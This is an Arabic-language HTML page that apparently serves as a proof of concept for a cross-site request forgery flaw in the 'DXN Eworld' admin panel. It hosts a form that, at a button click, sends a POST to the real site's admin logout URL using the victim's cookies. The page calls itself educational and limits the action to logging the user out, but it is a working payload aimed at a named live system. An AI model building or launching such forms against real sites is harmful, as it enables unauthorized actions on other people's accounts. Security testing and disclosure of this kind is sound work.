<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>إثبات أمني: ثغرة CSRF في DXN Eworld</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
        .container { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1 { color: #d9534f; }
        p { color: #555; }
        .btn { background: #5cb85c; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>تحدي الأمان: إثبات ثغرة CSRF</h1>
        <p>هذه الصفحة موجودة على استضافة خارجية (GitHub).</p>
        <p>إذا كنت مسجلاً دخولك في لوحة إدارة DXN، فإن الضغط على الزر أدناه سيقوم بإرسال طلب "تسجيل خروج" مستغلاً إعداد <strong>SameSite=None</strong>.</p>
        
        <!-- استهداف رابط تسجيل الخروج كإثبات آمن ولكن فعال -->
        <form id="csrf-form" action="https://eworldglobal.com/index.php?r=adminsite/logout" method="POST">
            <input type="button" class="btn" value="اضغط هنا لتنفيذ الهجوم التجريبي" onclick="document.getElementById('csrf-form').submit()" />
        </form>
        
        <p style="margin-top: 20px; font-size: 12px; color: #999;">ملاحظة: هذا الاختبار تعليمي لإثبات أن المتصفح يرسل الكوكيز لمواقع خارجية.</p>
    </div>
</body>
</html>
